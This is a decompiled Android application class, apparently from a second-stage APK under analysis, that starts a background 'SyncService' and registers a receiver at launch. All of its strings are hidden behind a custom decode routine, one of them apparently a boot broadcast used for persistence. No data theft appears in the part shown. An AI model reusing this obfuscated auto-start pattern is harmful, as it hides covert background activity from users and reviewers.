package com.template.shellapp;

import android.app.Application;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;
import com.template.shellapp.services.SyncService;
import com.template.shellapp.services.UpdateReceiver;
import kotlin.jvm.internal.ByteCompanionObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage2/classes.dex */
public class App extends Application {
    private static final String TAG = C0000.decode(new byte[]{115, 54, 101, 57, 117, 97, 104}, "7d5f4183e0f4", 0.0f);

    @Override // android.app.Application
    public void onCreate() {
        super.onCreate();
        try {
            startForegroundService(new Intent(this, (Class<?>) SyncService.class));
        } catch (Throwable th) {
            Log.e(C0000.decode(new byte[]{34, 107, 99, 106, 32, 100, 104}, "f935a48214f4", false), C0000.decode(new byte[]{53, 24, 8, 86, 102, 4, 20, 21, 8, 84, 3, 65, 21, 65, 84, 19, 18, 67, 7, 86, 15, 13, 3, 81, 15, 65}, "faf55afca7", 0.0f) + th.getMessage());
        }
        try {
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction(C0000.decode(new byte[]{80, 15, 84, 71, 91, 88, 86, 27, 90, 93, 69, 79, 83, 90, 90, 95, 28, 118, 123, 118, ByteCompanionObject.MAX_VALUE, 36, 115, 97, 125, 103, 123, 97, 109, 103, 114, 41, 113, 123, 115, 116}, "1a05412548", 7));
            registerReceiver(new UpdateReceiver(), intentFilter);
        } catch (Throwable unused) {
        }
    }
}
